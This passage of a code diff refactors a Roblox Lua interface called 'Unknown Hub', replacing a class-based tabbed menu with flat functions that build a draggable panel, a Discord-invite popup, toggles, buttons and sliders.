-            math.clamp(pos.Y.Scale + particle.speedY * dt, 0, 1),
-            0
-        )
-        particle.instance.Rotation = particle.instance.Rotation + particle.rotSpeed * dt
-        
-        -- Wrap around
-        if pos.X.Scale < -0.05 then particle.instance.Position = UDim2.new(1.05, 0, pos.Y.Scale, 0) end
-        if pos.X.Scale > 1.05 then particle.instance.Position = UDim2.new(-0.05, 0, pos.Y.Scale, 0) end
-        if pos.Y.Scale < -0.05 then particle.instance.Position = UDim2.new(pos.X.Scale, 0, 1.05, 0) end
-        if pos.Y.Scale > 1.05 then particle.instance.Position = UDim2.new(pos.X.Scale, 0, -0.05, 0) end
+    
+    linkBtn.MouseButton1Click:Connect(function()
+        if copyToClipboard(DISCORD_LINK) then
+            toast.Text = "Link copied: discord.gg/unknown-hub"
+        else
+            toast.Text = "Clipboard not supported. Link: discord.gg/unknown-hub"
+        end
+    end)
+    
+    local function closePopup()
+        config.__UnknownHubDiscordShown = true
+        saveConfigHard()
+        popupGui:Destroy()
     end
     
-    -- Animate progress bar
-    local targetSize = UDim2.fromScale(self.progress, 1)
-    self.progressFill.Size = UDim2.new(
-        Lerp(self.progressFill.Size.X.Scale, targetSize.X.Scale, 0.15),
-        0,
-        1,
-        0
-    )
+    closeBtn.MouseButton1Click:Connect(closePopup)
+    popupOverlay.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            closePopup()
+        end
+    end)
     
-    -- Pulse logo when complete
-    if self.isComplete then
-        local pulse = math.sin(tick() * 4) * 0.1 + 1
-        self.logoCircle.Size = UDim2.fromOffset(100 * pulse, 100 * pulse)
-    end
+    card.Size = UDim2.fromOffset(0, 0)
+    TweenService:Create(card, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.fromOffset(380, 228)}):Play()
 end
 
 -- ═══════════════════════════════════════════════════════════════
 -- MAIN HUB GUI
 -- ═══════════════════════════════════════════════════════════════
-local Hub = {}
-Hub.__index = Hub
+local hubGui = Instance.new("ScreenGui")
+hubGui.Name = "UnknownHub"
+hubGui.IgnoreGuiInset = true
+hubGui.ResetOnSpawn = false
+hubGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+hubGui.Parent = playerGui
 
-function Hub.new()
-    local self = setmetatable({}, Hub)
-    self.isOpen = false
-    self.tabs = {}
-    self.currentTab = nil
-    self.toggles = {}
-    self.sliders = {}
-    self.buttons = {}
-    
-    self:BuildGui()
-    return self
-end
+local hubMain = _makeCard(hubGui, UDim2.fromOffset(220, 380))
+hubMain.AnchorPoint = Vector2.new(1, 0.5)
+hubMain.Position = UDim2.new(1, -20, 0.5, 0)
+hubMain.Visible = false
 
-function Hub:BuildGui()
-    -- Main GUI
-    self.gui = Create("ScreenGui", {
-        Name = "UnknownHub",
-        IgnoreGuiInset = true,
-        ResetOnSpawn = false,
-        ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
-        Enabled = false
-    }, playerGui)
-    
-    -- Background blur
-    self.blur = Create("Frame", {
-        Size = UDim2.fromScale(1, 1),
-        BackgroundColor3 = Colors.SHADOW,
-        BackgroundTransparency = 0.4,
-        BorderSizePixel = 0
-    }, self.gui)
-    
-    -- Main container
-    self.main = Create("Frame", {
-        Size = UDim2.fromOffset(520, 420),
-        Position = UDim2.fromScale(0.5, 0.5),
-        AnchorPoint = Vector2.new(0.5, 0.5),
-        BackgroundColor3 = Colors.BG_DARK,
-        BorderSizePixel = 0
-    }, self.gui)
-    AddCorner(self.main, 16)
-    AddStroke(self.main, Colors.STROKE, 1, 0.3)
-    
-    -- Shadow effect
-    local shadow = Create("ImageLabel", {
-        Size = UDim2.new(1, 40, 1, 40),
-        Position = UDim2.new(0, -20, 0, -20),
-        BackgroundTransparency = 1,
-        Image = "rbxassetid://6015897843",
-        ImageColor3 = Colors.SHADOW,
-        ImageTransparency = 0.3,
-        ScaleType = Enum.ScaleType.Slice,
-        SliceCenter = Rect.new(49, 49, 450, 450)
-    }, self.main)
-    shadow.ZIndex = -1
-    
-    -- Title bar
-    self.titleBar = Create("Frame", {
-        Size = UDim2.new(1, 0, 0, 50),
-        BackgroundColor3 = Colors.BG_CARD,
-        BorderSizePixel = 0
-    }, self.main)
-    AddCorner(self.titleBar, 16)
-    
-    -- Fix bottom corners of title bar
-    local titleFix = Create("Frame", {
-        Size = UDim2.new(1, 0, 0, 16),
-        Position = UDim2.new(0, 0, 1, -16),
-        BackgroundColor3 = Colors.BG_CARD,
-        BorderSizePixel = 0
-    }, self.titleBar)
-    
-    -- Title gradient bar
-    local titleGrad = Create("Frame", {
-        Size = UDim2.new(1, 0, 0, 3),
-        Position = UDim2.new(0, 0, 1, 0),
-        BackgroundColor3 = Colors.ACCENT,
-        BorderSizePixel = 0
-    }, self.titleBar)
-    AddGradient(titleGrad, 0, {Colors.ACCENT, Colors.ACCENT_DARK, Colors.ACCENT})
-    
-    -- Title text
-    self.titleText = Create("TextLabel", {
-        Size = UDim2.new(1, -80, 1, 0),
-        Position = UDim2.new(0, 16, 0, 0),
-        BackgroundTransparency = 1,
-        Text = "UNKNOWN HUB",
-        Font = Enum.Font.GothamBlack,
-        TextSize = 18,
-        TextColor3 = Colors.TEXT_PRIMARY,
-        TextXAlignment = Enum.TextXAlignment.Left
-    }, self.titleBar)
-    
-    -- Close button
-    self.closeBtn = Create("TextButton", {
-        Size = UDim2.fromOffset(36, 36),
-        Position = UDim2.new(1, -44, 0.5, -18),
-        BackgroundColor3 = Colors.BG_CARD_2,
-        BorderSizePixel = 0,
-        Text = "✕",
-        Font = Enum.Font.GothamBold,
-        TextSize = 16,
-        TextColor3 = Colors.TEXT_SECONDARY,
-        AutoButtonColor = true
-    }, self.titleBar)
-    AddCorner(self.closeBtn, 8)
-    
-    self.closeBtn.MouseButton1Click:Connect(function()
-        self:Toggle()
-    end)
-    
-    -- Minimize button
-    self.minBtn = Create("TextButton", {
-        Size = UDim2.fromOffset(36, 36),
-        Position = UDim2.new(1, -84, 0.5, -18),
-        BackgroundColor3 = Colors.BG_CARD_2,
-        BorderSizePixel = 0,
-        Text = "—",
-        Font = Enum.Font.GothamBold,
-        TextSize = 16,
-        TextColor3 = Colors.TEXT_SECONDARY,
-        AutoButtonColor = true
-    }, self.titleBar)
-    AddCorner(self.minBtn, 8)
-    
-    -- Tab bar (left side)
-    self.tabBar = Create("Frame", {
-        Size = UDim2.new(0, 130, 1, -56),
-        Position = UDim2.new(0, 8, 0, 52),
-        BackgroundColor3 = Colors.BG_CARD,
-        BorderSizePixel = 0
-    }, self.main)
-    AddCorner(self.tabBar, 12)
-    
-    -- Tab list
-    self.tabList = Create("ScrollingFrame", {
-        Size = UDim2.new(1, -8, 1, -8),
-        Position = UDim2.new(0, 4, 0, 4),
-        BackgroundTransparency = 1,
-        ScrollBarThickness = 2,
-        ScrollBarImageColor3 = Colors.ACCENT,
-        BorderSizePixel = 0,
-        CanvasSize = UDim2.fromScale(0, 0),
-        AutomaticCanvasSize = Enum.AutomaticSize.Y
-    }, self.tabBar)
-    
-    -- Content area (right side)
-    self.contentArea = Create("Frame", {
-        Size = UDim2.new(1, -150, 1, -56),
-        Position = UDim2.new(0, 146, 0, 52),
-        BackgroundTransparency = 1,
-        BorderSizePixel = 0
-    }, self.main)
-    
-    -- Make draggable
-    self:MakeDraggable(self.titleBar, self.main)
-    
-    -- Keybind
-    self.bindKey = Enum.KeyCode.RightShift
-    UserInputService.InputBegan:Connect(function(input, processed)
-        if processed then return end
-        if input.KeyCode == self.bindKey then
-            self:Toggle()
-        end
-    end)
-end
+local hubTop = _makeTopBar(hubMain, "Unknown Hub")
 
-function Hub:MakeDraggable(handle, frame)
-    local dragging = false
-    local dragStart, startPos
-    
-    handle.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = frame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
-            end)
-        end
-    end)
-    
-    UserInputService.InputChanged:Connect(function(input)
-        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-            local delta = input.Position - dragStart
-            frame.Position = UDim2.new(
-                startPos.X.Scale, startPos.X.Offset + delta.X,
-                startPos.Y.Scale, startPos.Y.Offset + delta.Y
-            )
-        end
-    end)
-end
+local hubCloseBtn = Instance.new("TextButton")
+hubCloseBtn.Parent = hubTop
+hubCloseBtn.BackgroundColor3 = COLOR_SURFACE
+hubCloseBtn.AutoButtonColor = true
+hubCloseBtn.BorderSizePixel = 0
+hubCloseBtn.Text = "X"
+hubCloseBtn.Font = Enum.Font.GothamBold
+hubCloseBtn.TextSize = 12
+hubCloseBtn.TextColor3 = COLOR_TEXT
+hubCloseBtn.Size = UDim2.fromOffset(24, 24)
+hubCloseBtn.Position = UDim2.new(1, -32, 0.5, -12)
+local hubCloseBtnCorner = Instance.new("UICorner")
+hubCloseBtnCorner.CornerRadius = UDim.new(0, 6)
+hubCloseBtnCorner.Parent = hubCloseBtn
 
-function Hub:AddTab(name, icon)
-    local tab = {
-        name = name,
-        icon = icon or "○",
-        content = nil,
-        button = nil
-    }
-    
-    -- Tab button
-    local btn = Create("TextButton", {
-        Size = UDim2.new(1, -8, 0, 38),
-        BackgroundColor3 = Colors.BG_CARD_2,
-        BackgroundTransparency = 0,
-        BorderSizePixel = 0,
-        Text = "  " .. (icon or "") .. "  " .. name,
-        Font = Enum.Font.GothamBold,
-        TextSize = 13,
-        TextColor3 = Colors.TEXT_SECONDARY,
-        TextXAlignment = Enum.TextXAlignment.Left,
-        AutoButtonColor = false
-    }, self.tabList)
-    AddCorner(btn, 8)
-    
-    -- Tab content
-    local content = Create("ScrollingFrame", {
-        Size = UDim2.new(1, 0, 1, 0),
-        BackgroundTransparency = 1,
-        ScrollBarThickness = 3,
-        ScrollBarImageColor3 = Colors.ACCENT,
-        BorderSizePixel = 0,
-        CanvasSize = UDim2.fromScale(0, 0),
-        AutomaticCanvasSize = Enum.AutomaticSize.Y,
-        Visible = false
-    }, self.contentArea)
-    
-    -- Content layout
-    local layout = Create("UIListLayout", {
-        Padding = UDim.new(0, 8),
-        SortOrder = Enum.SortOrder.LayoutOrder,
-        HorizontalAlignment = Enum.HorizontalAlignment.Center
-    }, content)
-    
-    Create("UIPadding", {
-        PaddingTop = UDim.new(0, 8),
-        PaddingBottom = UDim.new(0, 8),
-        PaddingLeft = UDim.new(0, 4),
-        PaddingRight = UDim.new(0, 4)
-    }, content)
-    
-    tab.content = content
-    tab.button = btn
-    
-    btn.MouseButton1Click:Connect(function()
-        self:SelectTab(name)
-    end)
-    
-    btn.MouseEnter:Connect(function()
-        if self.currentTab ~= name then
-            TweenService:Create(btn, TweenInfo.new(0.2), {
-                BackgroundTransparency = 0.5
-            }):Play()
-        end
-    end)
-    
-    btn.MouseLeave:Connect(function()
-        if self.currentTab ~= name then
-            TweenService:Create(btn, TweenInfo.new(0.2), {
-                BackgroundTransparency = 0
-            }):Play()
-        end
-    end)
-    
-    self.tabs[name] = tab
-    return tab
-end
+local hubMinBtn = Instance.new("TextButton")
+hubMinBtn.Parent = hubTop
+hubMinBtn.BackgroundColor3 = COLOR_SURFACE
+hubMinBtn.AutoButtonColor = true
+hubMinBtn.BorderSizePixel = 0
+hubMinBtn.Text = "—"
+hubMinBtn.Font = Enum.Font.GothamBold
+hubMinBtn.TextSize = 14
+hubMinBtn.TextColor3 = COLOR_TEXT
+hubMinBtn.Size = UDim2.fromOffset(24, 24)
+hubMinBtn.Position = UDim2.new(1, -60, 0.5, -12)
+local hubMinBtnCorner = Instance.new("UICorner")
+hubMinBtnCorner.CornerRadius = UDim.new(0, 6)
+hubMinBtnCorner.Parent = hubMinBtn
 
-function Hub:SelectTab(name)
-    -- Hide all tabs
-    for tabName, tab in pairs(self.tabs) do
-        tab.content.Visible = false
-        TweenService:Create(tab.button, TweenInfo.new(0.2), {
-            BackgroundColor3 = Colors.BG_CARD_2,
-            TextColor3 = Colors.TEXT_SECONDARY
-        }):Play()
+local contentScroll = Instance.new("ScrollingFrame")
+contentScroll.Name = "Content"
+contentScroll.Parent = hubMain
+contentScroll.Size = UDim2.new(1, -16, 1, -60)
+contentScroll.Position = UDim2.new(0, 8, 0, 54)
+contentScroll.BackgroundTransparency = 1
+contentScroll.ScrollBarThickness = 3
+contentScroll.ScrollBarImageColor3 = COLOR_STROKE_MAIN
+contentScroll.BorderSizePixel = 0
+contentScroll.CanvasSize = UDim2.fromScale(0, 0)
+contentScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+
+local contentLayout = Instance.new("UIListLayout")
+contentLayout.Parent = contentScroll
+contentLayout.Padding = UDim.new(0, 6)
+contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
+contentLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local contentPadding = Instance.new("UIPadding")
+contentPadding.Parent = contentScroll
+contentPadding.PaddingTop = UDim.new(0, 4)
+contentPadding.PaddingBottom = UDim.new(0, 4)
+
+local hubVisible = false
+local hubMinimized = false
+
+local function ToggleHub()
+    if hubMinimized then
+        hubMinimized = false
     end
-    
-    -- Show selected tab
-    local tab = self.tabs[name]
-    if tab then
-        tab.content.Visible = true
-        TweenService:Create(tab.button, TweenInfo.new(0.2), {
-            BackgroundColor3 = Colors.ACCENT_DARK,
-            TextColor3 = Colors.TEXT_PRIMARY
-        }):Play()
-        self.currentTab = name
-    end
+    hubVisible = not hubVisible
+    hubMain.Visible = hubVisible
 end
 
-function Hub:AddToggle(tabName, name, default, callback)
-    local tab = self.tabs[tabName]
-    if not tab then return nil end
-    
-    local isOn = default or (settings[tabName .. "_" .. name] ~= nil and settings[tabName .. "_" .. name]) or false
-    settings[tabName .. "_" .. name] = isOn
-    
-    local container = Create("Frame", {
-        Size = UDim2.new(1, -8, 0, 44),
-        BackgroundColor3 = Colors.BG_CARD,
-        BorderSizePixel = 0
-    }, tab.content)
-    AddCorner(container, 10)
-    
-    local label = Create("TextLabel", {
-        Size = UDim2.new(1, -60, 1, 0),
-        Position = UDim2.new(0, 14, 0, 0),
-        BackgroundTransparency = 1,
-        Text = name,
-        Font = Enum.Font.GothamBold,
-        TextSize = 14,
-        TextColor3 = Colors.TEXT_PRIMARY,
-        TextXAlignment = Enum.TextXAlignment.Left
-    }, container)
-    
-    -- Toggle background
-    local toggleBg = Create("Frame", {
-        Size = UDim2.fromOffset(44, 24),
-        Position = UDim2.new(1, -56, 0.5, -12),
-        BackgroundColor3 = isOn and Colors.TOGGLE_ON or Colors.TOGGLE_OFF,
-        BorderSizePixel = 0
-    }, container)
-    AddCorner(toggleBg, 12)
-    
-    -- Toggle circle
-    local toggleCircle = Create("Frame", {
-        Size = UDim2.fromOffset(18, 18),
-        Position = isOn and UDim2.new(1, -22, 0.5, -9) or UDim2.new(0, 3, 0.5, -9),
-        BackgroundColor3 = Colors.TEXT_PRIMARY,
-        BorderSizePixel = 0
-    }, toggleBg)
-    AddCorner(toggleCircle, 9)
-    
-    local toggleData = {
-        isOn = isOn,
-        container = container,
-        bg = toggleBg,
-        circle = toggleCircle,
-        callback = callback
-    }
-    
-    local function setToggle(state)
-        toggleData.isOn = state
-        settings[tabName .. "_" .. name] = state
-        SaveConfig()
-        
-        TweenService:Create(toggleBg, TweenInfo.new(0.25, Enum.EasingStyle.Quart), {
-            BackgroundColor3 = state and Colors.TOGGLE_ON or Colors.TOGGLE_OFF
-        }):Play()
-        
-        TweenService:Create(toggleCircle, TweenInfo.new(0.25, Enum.EasingStyle.Quart), {
-            Position = state and UDim2.new(1, -22, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
-        }):Play()
-        
-        if callback then
-            pcall(callback, state)
-        end
+local function MinimizeHub()
+    hubMinimized = true
+    hubVisible = false
+    hubMain.Visible = false
+end
+
+hubCloseBtn.MouseButton1Click:Connect(MinimizeHub)
+hubMinBtn.MouseButton1Click:Connect(MinimizeHub)
+
+local bindKey = Enum.KeyCode.RightShift
+UserInputService.InputBegan:Connect(function(input, processed)
+    if processed then return end
+    if input.KeyCode == bindKey then
+        ToggleHub()
     end
+end)
+
+local dragging = false
+local dragStart, startPos
+
+hubTop.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = hubMain.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        hubMain.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+-- ═══════════════════════════════════════════════════════════════
+-- UI ELEMENT FUNCTIONS
+-- ═══════════════════════════════════════════════════════════════
+
+local function CreateLabel(text, order)
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(1, -8, 0, 20)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = text
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextSize = 12
+    lbl.TextColor3 = COLOR_TEXT_MUTED
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.LayoutOrder = order or 0
+    lbl.Parent = contentScroll
+    return lbl
+end
+
+local function CreateSeparator(order)
+    local sep = Instance.new("Frame")
+    sep.Size = UDim2.new(1, -16, 0, 1)
+    sep.BackgroundColor3 = COLOR_SURFACE
+    sep.BackgroundTransparency = 0.5
+    sep.BorderSizePixel = 0
+    sep.LayoutOrder = order or 0
+    sep.Parent = contentScroll
+    return sep
+end
+
+local function CreateToggle(name, default, callback, order)
+    local isOn = default or false
+    
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(1, -8, 0, 40)
+    container.BackgroundColor3 = COLOR_SURFACE_DARK
+    container.BackgroundTransparency = 0.3
+    container.BorderSizePixel = 0
+    container.LayoutOrder = order or 0
+    container.Parent = contentScroll
+    local containerCorner = Instance.new("UICorner")
+    containerCorner.CornerRadius = UDim.new(0, 10)
+    containerCorner.Parent = container
+    
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -50, 1, 0)
+    label.Position = UDim2.new(0, 12, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Text = name
+    label.Font = Enum.Font.GothamBold
+    label.TextSize = 13
+    label.TextColor3 = COLOR_TEXT
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.TextTruncate = Enum.TextTruncate.AtEnd
+    label.Parent = container
+    
+    local toggleBg = Instance.new("Frame")
+    toggleBg.Size = UDim2.fromOffset(38, 20)
+    toggleBg.Position = UDim2.new(1, -46, 0.5, -10)
+    toggleBg.BackgroundColor3 = isOn and COLOR_TEAL_ON or COLOR_TOGGLE_OFF
+    toggleBg.BorderSizePixel = 0
+    toggleBg.Parent = container
+    local toggleBgCorner = Instance.new("UICorner")
+    toggleBgCorner.CornerRadius = UDim.new(0, 10)
+    toggleBgCorner.Parent = toggleBg
+    
+    local toggleCircle = Instance.new("Frame")
+    toggleCircle.Size = UDim2.fromOffset(14, 14)
+    toggleCircle.Position = isOn and UDim2.new(1, -19, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
+    toggleCircle.BackgroundColor3 = COLOR_TEXT
+    toggleCircle.BorderSizePixel = 0
+    toggleCircle.Parent = toggleBg
+    local toggleCircleCorner = Instance.new("UICorner")
+    toggleCircleCorner.CornerRadius = UDim.new(0, 7)
+    toggleCircleCorner.Parent = toggleCircle
     
     container.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            setToggle(not toggleData.isOn)
+            isOn = not isOn
+            TweenService:Create(toggleBg, TweenInfo.new(0.2), {
+                BackgroundColor3 = isOn and COLOR_TEAL_ON or COLOR_TOGGLE_OFF
+            }):Play()
+            TweenService:Create(toggleCircle, TweenInfo.new(0.2), {
+                Position = isOn and UDim2.new(1, -19, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
+            }):Play()
+            if callback then
+                pcall(callback, isOn)
+            end
         end
     end)
     
-    self.toggles[tabName .. "_" .. name] = toggleData
-    return toggleData
+    container.MouseEnter:Connect(function()
+        TweenService:Create(container, TweenInfo.new(0.15), {BackgroundTransparency = 0.1}):Play()
+    end)
+    
+    container.MouseLeave:Connect(function()
+        TweenService:Create(container, TweenInfo.new(0.15), {BackgroundTransparency = 0.3}):Play()
+    end)
+    
+    return container
 end
 
-function Hub:AddSlider(tabName, name, min, max, default, callback)
-    local tab = self.tabs[tabName]
-    if not tab then return nil end
+local function CreateButton(name, callback, order)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, -8, 0, 36)
+    btn.BackgroundColor3 = COLOR_SURFACE_DARK
+    btn.BackgroundTransparency = 0.2
+    btn.BorderSizePixel = 0
+    btn.Text = name
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 13
+    btn.TextColor3 = COLOR_TEXT
+    btn.AutoButtonColor = false
+    btn.LayoutOrder = order or 0
+    btn.Parent = contentScroll
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 10)
+    btnCorner.Parent = btn
     
-    local value = default or (settings[tabName .. "_" .. name] or min)
-    settings[tabName .. "_" .. name] = value
+    local btnStroke = Instance.new("UIStroke")
+    btnStroke.Parent = btn
+    btnStroke.Thickness = 1
+    btnStroke.Transparency = 0.6
+    btnStroke.Color = COLOR_STROKE_MAIN
     
-    local container = Create("Frame", {
-        Size = UDim2.new(1, -8, 0, 60),
-        BackgroundColor3 = Colors.BG_CARD,
-        BorderSizePixel = 0
-    }, tab.content)
-    AddCorner(container, 10)
+    btn.MouseEnter:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.15), {
+            BackgroundColor3 = COLOR_HOVER,
+            BackgroundTransparency = 0
+        }):Play()
+    end)
     
-    local label = Create("TextLabel", {
-        Size = UDim2.new(1, -100, 0, 24),
-        Position = UDim2.new(0, 14, 0, 8),
-        BackgroundTransparency = 1,
-        Text = name,
-        Font = Enum.Font.GothamBold,
-        TextSize = 13,
-        TextColor3 = Colors.TEXT_PRIMARY,
-        TextXAlignment = Enum.TextXAlignment.Left
-    }, container)
+    btn.MouseLeave:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.15), {
+            BackgroundColor3 = COLOR_SURFACE_DARK,
+            BackgroundTransparency = 0.2
+        }):Play()
+    end)
     
-    local valueLabel = Create("TextLabel", {
-        Size = UDim2.new(0, 80, 0, 24),
-        Position = UDim2.new(1, -90, 0, 8),
-        BackgroundTransparency = 1,
-        Text = tostring(math.floor(value)),
-        Font = Enum.Font.GothamBold,
-        TextSize = 13,
-        TextColor3 = Colors.ACCENT,
-        TextXAlignment = Enum.TextXAlignment.Right
-    }, container)
+    btn.MouseButton1Click:Connect(function()
+        local originalText = btn.Text
+        btn.Text = "Loading..."
+        btn.TextColor3 = COLOR_TEAL_ON
+        spawn(function()
+            task.wait(0.5)
+            btn.Text = originalText
+            btn.TextColor3 = COLOR_TEXT
+            if callback then
+                pcall(callback)
+            end
+        end)
+    end)
     
-    -- Slider background
-    local sliderBg = Create("Frame", {
-        Size = UDim2.new(1, -28, 0, 8),
-        Position = UDim2.new(0, 14, 0, 38),
-        BackgroundColor3 = Colors.BG_CARD_2,
-        BorderSizePixel = 0
-    }, container)
-    AddCorner(sliderBg, 4)
+    return btn
+end
+
+local function CreateSlider(name, min, max, default, callback, order)
+    local value = default or min
     
-    -- Slider fill
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(1, -8, 0, 50)
+    container.BackgroundColor3 = COLOR_SURFACE_DARK
+    container.BackgroundTransparency = 0.3
+    container.BorderSizePixel = 0
+    container.LayoutOrder = order or 0
+    container.Parent = contentScroll
+    local containerCorner = Instance.new("UICorner")
+    containerCorner.CornerRadius = UDim.new(0, 10)
+    containerCorner.Parent = container
+    
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -60, 0, 22)
+    label.Position = UDim2.new(0, 12, 0, 6)
+    label.BackgroundTransparency = 1
+    label.Text = name
+    label.Font = Enum.Font.GothamBold
+    label.TextSize = 12
+    label.TextColor3 = COLOR_TEXT
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.TextTruncate = Enum.TextTruncate.AtEnd
+    label.Parent = container
+    
+    local valueLabel = Instance.new("TextLabel")
+    valueLabel.Size = UDim2.new(0, 50, 0, 22)
+    valueLabel.Position = UDim2.new(1, -58, 0, 6)
+    valueLabel.BackgroundTransparency = 1
+    valueLabel.Text = tostring(math.floor(value))
+    valueLabel.Font = Enum.Font.GothamBold
+    valueLabel.TextSize = 12
+    valueLabel.TextColor3 = COLOR_TEAL_ON
+    valueLabel.TextXAlignment = Enum.TextXAlignment.Right
+    valueLabel.Parent = container
+    
+    local sliderBg = Instance.new("Frame")
+    sliderBg.Size = UDim2.new(1, -24, 0, 6)
+    sliderBg.Position = UDim2.new(0, 12, 0, 34)
+    sliderBg.BackgroundColor3 = COLOR_TOGGLE_OFF
+    sliderBg.BorderSizePixel = 0
+    sliderBg.Parent = container
+    local sliderBgCorner = Instance.new("UICorner")
+    sliderBgCorner.CornerRadius = UDim.new(0, 3)
+    sliderBgCorner.Parent = sliderBg
+    
     local percent = (value - min) / (max - min)
-    local sliderFill = Create("Frame", {
-        Size = UDim2.fromScale(percent, 1),
-        BackgroundColor3 = Colors.ACCENT,
-        BorderSizePixel = 0
-    }, sliderBg)
-    AddCorner(sliderFill, 4)
+    local sliderFill = Instance.new("Frame")
+    sliderFill.Size = UDim2.fromScale(percent, 1)
+    sliderFill.BackgroundColor3 = COLOR_TEAL_ON
+    sliderFill.BorderSizePixel = 0
+    sliderFill.Parent = sliderBg
+    local sliderFillCorner = Instance.new("UICorner")
+    sliderFillCorner.CornerRadius = UDim.new(0, 3)
+    sliderFillCorner.Parent = sliderFill
     
-    -- Slider button
-    local sliderBtn = Create("Frame", {
-        Size = UDim2.fromOffset(16, 16),
-        Position = UDim2.fromScale(percent, 0.5),
-        AnchorPoint = Vector2.new(0.5, 0.5),
-        BackgroundColor3 = Colors.TEXT_PRIMARY,
-        BorderSizePixel = 0
-    }, sliderBg)
-    AddCorner(sliderBtn, 8)
-    
-    local sliderData = {
-        min = min,
-        max = max,
-        value = value,
-        container = container,
-        fill = sliderFill,
-        btn = sliderBtn,
-        valueLabel = valueLabel,
-        callback = callback
-    }
+    local sliderBtn = Instance.new("Frame")
+    sliderBtn.Size = UDim2.fromOffset(14, 14)
+    sliderBtn.Position = UDim2.fromScale(percent, 0.5)
+    sliderBtn.AnchorPoint = Vector2.new(0.5, 0.5)
+    sliderBtn.BackgroundColor3 = COLOR_TEXT
+    sliderBtn.BorderSizePixel = 0
+    sliderBtn.Parent = sliderBg
+    local sliderBtnCorner = Instance.new("UICorner")
+    sliderBtnCorner.CornerRadius = UDim.new(0, 7)
+    sliderBtnCorner.Parent = sliderBtn
     
     local function updateSlider(newValue)
-        sliderData.value = math.clamp(newValue, min, max)
-        settings[tabName .. "_" .. name] = sliderData.value
-        SaveConfig()
-        
-        local newPercent = (sliderData.value - min) / (max - min)
+        value = math.clamp(newValue, min, max)
+        local newPercent = (value - min) / (max - min)
         sliderFill.Size = UDim2.fromScale(newPercent, 1)
         sliderBtn.Position = UDim2.fromScale(newPercent, 0.5)
-        valueLabel.Text = tostring(math.floor(sliderData.value))
-        
+        valueLabel.Text = tostring(math.floor(value))
         if callback then
-            pcall(callback, sliderData.value)
+            pcall(callback, value)
         end
     end
     
-    local dragging = false
+    local isDragging = false
     
     sliderBtn.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
+            isDragging = true
         end
     end)
     
     sliderBg.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
+            isDragging = true
             local relPos = (input.Position.X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X
             updateSlider(min + relPos * (max - min))
         end
@@ -937,702 +901,156 @@ function Hub:AddSlider(tabName, name, min, max, default, callback)
     
     UserInputService.InputEnded:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = false
+            isDragging = false
         end
     end)
     
     UserInputService.InputChanged:Connect(function(input)
-        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
             local relPos = (input.Position.X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X
             updateSlider(min + relPos * (max - min))
-        end
-    end)
-    
-    self.sliders[tabName .. "_" .. name] = sliderData
-    return sliderData
-end
-
-function Hub:AddButton(tabName, name, callback, showLoading)
-    local tab = self.tabs[tabName]
-    if not tab then return nil end
-    
-    local container = Create("TextButton", {
-        Size = UDim2.new(1, -8, 0, 42),
-        BackgroundColor3 = Colors.BG_CARD,
-        BorderSizePixel = 0,
-        Text = "",
-        AutoButtonColor = false
-    }, tab.content)
-    AddCorner(container, 10)
-    AddStroke(container, Colors.STROKE, 1, 0.5)
-    
-    local label = Create("TextLabel", {
